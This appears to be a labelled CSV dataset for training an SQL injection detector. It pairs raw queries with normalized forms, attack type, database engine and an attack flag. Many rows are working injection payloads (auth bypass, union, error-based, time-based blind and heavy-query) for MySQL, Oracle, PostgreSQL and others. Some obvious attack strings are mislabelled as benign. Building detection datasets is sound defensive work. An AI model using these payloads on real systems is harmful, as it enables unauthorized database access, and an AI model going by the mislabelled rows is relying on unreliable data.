payload_norm,payload_delex,sqli_type,db_engine,confidence,is_attack
select * from users where id = '1' or \.<\ or 1 = 1 -- 1',select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ < \ or __INT__ = __INT__ - - __INT__,boolean_blind,mysql,0.85,True
SELECT * FROM invented WHERE remember BETWEEN 'nearer' AND 'rose',select * from __IDENT__ where __IDENT__ between __STR__ and __STR__,benign,mysql,0.9,False
SELECT option_value FROM wp_options WHERE option_name = 'zcf_crmformswpbuilder_settings' LIMIT 1,select __IDENT__ from __IDENT__ where __IDENT__ = __STR__ limit __INT__,benign,mysql,0.9,False
"select * from users WHERE username = ""1\' ) ) ) or username = ""1%\' and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )",select * from __IDENT__ where __IDENT__ = __INT__ __STR__ and __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ),error_based,oracle,0.95,True
' OR 1 = 1--,' or __INT__ = __INT__ - -,auth_bypass,generic,0.95,True
"1' ) ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( ( 'bacm' = 'bacm",__INT__ __STR__ __IDENT__ __STR__ __IDENT__,error_based,mysql,0.9,True
SELECT AVG ( ice ) FROM universe,select avg ( __IDENT__ ) from __IDENT__,benign,generic,1.0,False
5.53776E+15,__IDENT__ + __INT__,benign,generic,0.9,False
SELECT * FROM major WHERE NOT consider = 'as',select * from __IDENT__ where not __IDENT__ = __STR__,benign,generic,1.0,False
"1 ) ) as faxr where 7972 = 7972 or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --","__INT__ ) ) as __IDENT__ where __INT__ = __INT__ or __INT__ = ( select count ( * ) from __IDENT__ __IDENT__ , __IDENT__ __IDENT__ , __IDENT__ __IDENT__ , __IDENT__ __IDENT__ , __IDENT__ __IDENT__ ) - -",heavy_query,oracle,0.7,True
"select * from users WHERE username = ""1\' ) ) ) and ( ( ( \'jzpb\' = \'jzpb"" or username = ""1\'+ ( select \'pvej\' where 4496 = 4496 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ) +\'""",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__,boolean_blind,oracle,0.8,True
-4055' ) ) as yoez where 3816 = 3816 or ( 8459 = 8459 ) *4906--,- __INT__ ) ) as __IDENT__ where __INT__ = __INT__ or ( __INT__ = __INT__ ) * __INT__ - -,boolean_blind,generic,0.5,True
SELECT * FROM capital WHERE grabbed = 'fighting' LIMIT 3,select * from __IDENT__ where __IDENT__ = __STR__ limit __INT__,benign,generic,1.0,False
"cami son anglada, s/n","__IDENT__ __IDENT__ __IDENT__ , __IDENT__ / __IDENT__",benign,generic,0.9,False
"-6971"" or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ""ifuh"" like ""ifuh",- __INT__ __STR__ __IDENT__ __STR__ __IDENT__,out_of_band,oracle,0.9,True
SELECT * FROM frame WHERE afternoon = 'rest' AND City = 'bow',select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__,benign,generic,1.0,False
"-1258"" ) ) union all select 7734,7734,7734#","- __INT__ ) ) union all select __INT__ , __INT__ , __INT__",union_based,generic,0.7,True
SELECT TOP 50 PERCENT * FROM oxygen,select top __INT__ __IDENT__ * from __IDENT__,benign,mssql,1.0,False
"select * from users WHERE username = ""-8057\' ) ) as gpue where 4205 = 4205 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" or username = ""1\' and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )","select * from __IDENT__ where __IDENT__ = "" - __INT__ __STR__ and __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual )",error_based,postgresql,0.85,True
"-3707"" ) ) ) or 8571 = 8571--",- __INT__ ) ) ) or __INT__ = __INT__ - -,boolean_blind,generic,0.8,True
"select * from generate_series ( 4975,4975,case when ( 4975 = 9615 ) then 1 else 0 end ) limit 1--","select * from __IDENT__ ( __INT__ , __INT__ , case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) limit __INT__ - -",time_blind,postgresql,0.7,True
salip altares,__IDENT__ __IDENT__,benign,generic,0.9,False
"SELECT wealthID AS ID, particularly AS brown FROM break","select __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ from __IDENT__",benign,generic,1.0,False
"SELECT column1 , column2, ... FROM table_name WHERE NOT condition ;","select __IDENT__ , __IDENT__ , __IDENT__ from __IDENT__ where not __IDENT__ ;",benign,mysql,0.9,False
SELECT * FROM observe WHERE golden = 'various' AND ( character = 'gain' OR ball = 'dirty' ),select * from __IDENT__ where __IDENT__ = __STR__ and ( __IDENT__ = __STR__ or __IDENT__ = __STR__ ),benign,generic,1.0,False
85510378n,__IDENT__,benign,generic,0.9,False
"1 where 4468 = 4468 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --","__INT__ where __INT__ = __INT__ or char ( __INT__ ) | | char ( __INT__ ) | | char ( __INT__ ) | | char ( __INT__ ) = __IDENT__ ( repeat ( left ( __IDENT__ ( char ( __INT__ ) | | char ( __INT__ ) | | char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) - -",time_blind,postgresql,0.7,True
"select * from users WHERE username = ""1\' ) ) and username = ""-9564 and username = ""1"" and ( ( ( \'qhdg\' = \'qhdg""",select * from __IDENT__ where __IDENT__ = __STR__,auth_bypass,generic,0.5,True
"select * from users WHERE username = ""1\' ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( \'mndw\' = \'mndw"" or username = ""-7242\' and \'kfff\' = \'kfff""",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__,error_based,oracle,0.95,True
select case when 2095 = 9074 then 1 else null end--,select case when __INT__ = __INT__ then __INT__ else null end - -,boolean_blind,generic,0.5,True
"SELECT * FROM users WHERE username = ""1\'|| ( select \'tisi\' from dual where 1616 = 1616 OR username = ""-7184 ) as fshx where 3408 = 3408 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --""","select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ ) as __IDENT__ where __INT__ = __INT__ or __INT__ = __IDENT__ ( __INT__ , ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) - - """,boolean_blind,oracle,0.8,True
"select * from users WHERE username = ""1\'|| ( select \'mgel\' where 3591 = 3591 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ) ||\'"" and username = ""1\'+ ( select \'kicv\' where 1976 = 1976 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) ) +\'""",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__,error_based,oracle,0.95,True
"1'+ ( select kgon where 9014 = 9014 ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) ) +'",__INT__ __STR__,time_blind,postgresql,0.7,True
"1"" ) as duvm where 6190 = 6190 order by 1--",__INT__ ) as __IDENT__ where __INT__ = __INT__ order by __INT__ - -,unknown,generic,0.7,True
SELECT AVG ( victory ) FROM teeth SELECT SUM ( cloud ),select avg ( __IDENT__ ) from __IDENT__ select sum ( __IDENT__ ),benign,generic,1.0,False
"c/ gaspar reyes, 172 8?f","__IDENT__ / __IDENT__ __IDENT__ , __INT__ __IDENT__",benign,generic,0.9,False
trebaol@arroyomolinos-madrid.gq,__IDENT__ - __IDENT__,benign,generic,0.9,False
"select * from users WHERE username = ""1\'|| ( select \'yucg\' where 2576 = 2576 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) ) ||\'"" and ( ( \'ybgd\' = \'ybgd"" or username = ""-7874 ) ) )",select * from __IDENT__ where __IDENT__ = __STR__ and ( ( \ __STR__ = __IDENT__ __STR__ - __INT__ ) ) ),error_based,oracle,0.95,True
SELECT * FROM general WHERE half = 'log' FETCH FIRST 3 ROWS ONLY,select * from __IDENT__ where __IDENT__ = __STR__ fetch first __INT__ rows only,benign,generic,1.0,False
"1' where 7464 = 7464 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #","__INT__ where __INT__ = __INT__ and __INT__ = benchmark ( __INT__ , md5 ( __HEX__ ) ) #",time_blind,mysql,0.9,True
SELECT TOP 3 * FROM closer WHERE rather = 'log',select top __INT__ * from __IDENT__ where __IDENT__ = __STR__,benign,generic,1.0,False
1 ) where 4479 = 4479 rlike ( select ( case when ( 6351 = 4367 ) then 1 else 0x28 end ) ) --,__INT__ ) where __INT__ = __INT__ __IDENT__ ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __HEX__ end ) ) - -,benign,generic,1.0,False
"SELECT * FROM mail WHERE human NOT IN ( 'particles', 'porch', 'colony' )","select * from __IDENT__ where __IDENT__ not in ( __STR__ , __STR__ , __STR__ )",benign,mysql,0.9,False
"select * from users WHERE username = ""-8163 ) ) as cvai where 2360 = 2360 or username = ""1\' ) ) ) and ( ( ( \'cbnc\' like \'cbnc""",select * from __IDENT__ where __IDENT__ = __STR__ __INT__ __STR__ __IDENT__ __STR__ __IDENT__,boolean_blind,generic,0.85,True
"select * from users WHERE username = ""1 ) ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( 4694 = 4694"" and username = ""-2756\' where 6156 = 6156 and username = ""-1549\' ) or username = ""-9564 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) ""","select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__ - __INT__ or __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ) """,error_based,oracle,0.95,True
"select * from users WHERE username = ""1 ) ) or username = ""-9668\' ) ) as orfu where 5822 = 5822 or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --""","select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ ) ) as __IDENT__ where __INT__ = __INT__ or __INT__ in ( ( char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + ( select ( case when ( __INT__ = __INT__ ) then char ( __INT__ ) else char ( __INT__ ) end ) ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) ) ) - - """,boolean_blind,postgresql,0.9,True
"select * from users WHERE username = ""-3880 ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( 5194 = 5194"" and username = ""1 ) ) as dgso where 4654 = 4654 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --""",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__,error_based,postgresql,0.9,True
"select * from users WHERE username = ""1\'+ ( select oljg where 2006 = 2006 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) ) +\'"" and username = ""-4108\' ) and ( \'tqjx\' = \'tqjx"" and username = ""-3424\' ) )","select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__ and __IDENT__ = "" - __INT__ ) )",boolean_blind,oracle,0.8,True
"1' ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )","__INT__ ) or __INT__ = ( select count ( * ) from __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ )",heavy_query,db2,0.7,True
SELECT * FROM wife WHERE slight = 'operation' LIMIT 3,select * from __IDENT__ where __IDENT__ = __STR__ limit __INT__,benign,generic,1.0,False
zauhar,__IDENT__,benign,generic,0.9,False
enardecedora,__IDENT__,benign,generic,0.9,False
"select * from users WHERE username = ""1"" or username = ""1%\' ) ) and username = ""-7430\' ) as xfah where 1596 = 1596",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __INT__ % \ __STR__ ) as __IDENT__ where __INT__ = __INT__,auth_bypass,generic,0.6,True
"-3219"" ) order by 1--",- __INT__ ) order by __INT__ - -,union_based,generic,0.7,True
"1"" ) ) as aamh where 7432 = 7432 ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) --","__INT__ ) ) as __IDENT__ where __INT__ = __INT__ ( select ( case when ( __INT__ = __INT__ ) then __IDENT__ ( repeat ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) else char ( __INT__ ) | | char ( __INT__ ) | | char ( __INT__ ) | | char ( __INT__ ) end ) from __IDENT__ ) - -",benign,generic,1.0,False
"SELECT tired AS history, slide AS [too] FROM plenty","select __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ from __IDENT__",benign,mysql,0.9,False
"select * from users WHERE username = ""1\'|| ( select \'rjis\' from dual where 7696 = 7696 and username = ""-8112\' ) ) ) and ( ( ( \'xopg\' = \'xopg"" or username = ""1\' ) or username = ""1\' ) )",select * from __IDENT__ where __IDENT__ = __STR__ __INT__ ) ),auth_bypass,generic,0.7,True
"1"" ) ) as dooi where 1806 = 1806 and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --","__INT__ ) ) as __IDENT__ where __INT__ = __INT__ and __INT__ = ( select count ( * ) from __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ ) - -",heavy_query,firebird,0.7,True
"select * from users WHERE username = ""1\'|| ( select \'rjun\' where 8868 = 8868 and username = ""-8099%\' ) ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( \'%\' = \'""",select * from __IDENT__ where __IDENT__ = __STR__,boolean_blind,oracle,0.8,True
SELECT * FROM talk WHERE trip = 'stepped' AND ( night = 'arrive' OR growth = 'might' ),select * from __IDENT__ where __IDENT__ = __STR__ and ( __IDENT__ = __STR__ or __IDENT__ = __STR__ ),benign,generic,1.0,False
"SELECT hiddenID AS ID, aid AS fell FROM bet","select __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ from __IDENT__",benign,generic,1.0,False
rumsey@ubikuo.coop,__IDENT__,benign,generic,0.9,False
necforo,__IDENT__,benign,generic,0.9,False
"select * from users WHERE username = ""1 where 5161 = 5161 or username = ""-4322\' ) ) as magw where 1627 = 1627 or username = ""-6353%\' ) ) or username = ""-6190\' ) where 2621 = 2621 or-- 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --""",select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ __STR__ ) ) or __IDENT__ = __STR__,error_based,oracle,0.95,True
"1 ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( 6986 = 6986","__INT__ ) __IDENT__ __IDENT__ ( __IDENT__ ( __INT__ , concat ( __HEX__ , __HEX__ , ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) ) , __HEX__ ) ) , __INT__ ) and ( __INT__ = __INT__",error_based,mysql,0.9,True
SELECT option_value FROM wp_options WHERE option_name = '_transient_houzez_verification_success' LIMIT 1,select __IDENT__ from __IDENT__ where __IDENT__ = __STR__ limit __INT__,benign,mysql,0.9,False
"select * from users WHERE username = ""-5013\' ) ) ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( \'ehwh\' like \'ehwh"" or username = ""-9668\' ) ) as orfu where 5822 = 5822","select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = "" - __INT__ ) ) as __IDENT__ where __INT__ = __INT__",error_based,mssql,0.85,True
1 ) as fxfe where 1148 = 1148 or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,__INT__ ) as __IDENT__ where __INT__ = __INT__ or ( select * from ( select ( sleep ( __INT__ ) ) ) __IDENT__ ) #,time_blind,mysql,0.7,True
"SELECT COUNT ( whispered ) , immediately FROM word BY thousand","select count ( __IDENT__ ) , __IDENT__ from __IDENT__ by __IDENT__",benign,mysql,0.9,False
"1, ( begin if ( 8340 = 8340 ) then dbms_lock.sleep ( 5 )","__INT__ , ( __IDENT__ if ( __INT__ = __INT__ ) then __IDENT__ ( __INT__ )",time_blind,oracle,0.9,True
1'|| ( select 'feyg' from dual where 7734 = 7734 and 3843 = 6724#,__INT__ __STR__ __IDENT__ from dual where __INT__ = __INT__ and __INT__ = __INT__,boolean_blind,generic,0.5,True
-4713' ) ) ) or 4567 = 1287,- __INT__ ) ) ) or __INT__ = __INT__,benign,generic,1.0,False
SELECT * FROM minerals WHERE NOT old = 'down',select * from __IDENT__ where not __IDENT__ = __STR__,benign,generic,1.0,False
"SELECT * FROM users WHERE username = ""-5585\' or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) "" AND username = ""1\' ) where 2511 = 2511","select * from __IDENT__ where __IDENT__ = "" - __INT__ __STR__ ) where __INT__ = __INT__",error_based,oracle,0.95,True
SELECT * FROM swing WHERE explain BETWEEN '1996-07-01' AND '1996-07-31',select * from __IDENT__ where __IDENT__ between __STR__ and __STR__,benign,mysql,0.9,False
"-6870"" ) as deox where 8198 = 8198 union all select 8198#",- __INT__ ) as __IDENT__ where __INT__ = __INT__ union all select __INT__,union_based,generic,0.7,True
22655130s,__IDENT__,benign,generic,0.9,False
SELECT * FROM pupil,select * from __IDENT__,benign,mysql,0.9,False
"select * from users WHERE username = ""-3899\' ) where 8152 = 8152 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" and username = ""1\' or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --""",select * from __IDENT__ where __IDENT__ = __STR__,error_based,oracle,0.9,True
"1'|| ( select 'zdfo' from dual where 4288 = 4288 union all select null,null,null,null,null,null,null--","__INT__ __STR__ __IDENT__ from dual where __INT__ = __INT__ union all select null , null , null , null , null , null , null - -",union_based,oracle,0.7,True
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN ( 28450 ) ORDER BY meta_id ASC","select __IDENT__ , __IDENT__ , __IDENT__ from __IDENT__ where __IDENT__ in ( __INT__ ) order by __IDENT__ asc",benign,mysql,0.9,False
"select * from users WHERE username = ""-5863"" and ""gkvy"" = ""gkvy"" or username = ""1\' ) ) ) and ( ( ( \'njge\' like \'njge""",select * from __IDENT__ where __IDENT__ = __STR__ and __STR__ = __STR__ or __IDENT__ = __STR__,boolean_blind,generic,0.85,True
